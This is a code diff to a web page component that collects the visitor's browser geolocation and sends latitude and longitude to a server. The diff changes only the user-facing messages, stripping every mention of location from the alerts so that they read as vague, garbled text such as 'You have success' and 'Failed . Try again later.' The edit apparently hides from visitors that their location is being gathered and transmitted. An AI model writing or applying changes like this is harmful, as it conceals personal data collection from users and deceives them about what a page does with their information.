@@ -6,7 +6,7 @@ export default function Home() {
 
   const getLocation = () => {
     if (!navigator.geolocation) {
-      alert("Geolocation is not supported by your browser.");
+      alert("That  is not supported by your browser.");
       return;
     }
 
@@ -24,15 +24,15 @@ export default function Home() {
           body: JSON.stringify({ latitude, longitude }),
         })
           .then(() => {
-            alert("Location received successfully.");
+            alert("You have success.");
           })
           .catch(() => {
-            alert("Failed to send location. Please try again.");
+            alert("Failed . Please try again.");
           });
       },
       (error) => {
-        setError("Location not found. Please check your settings or try again.");
-        alert("Failed to get location. Try again later.");
+        setError(" not found. Please check your settings or try again.");
+        alert("Failed . Try again later.");
       }
     );
   };
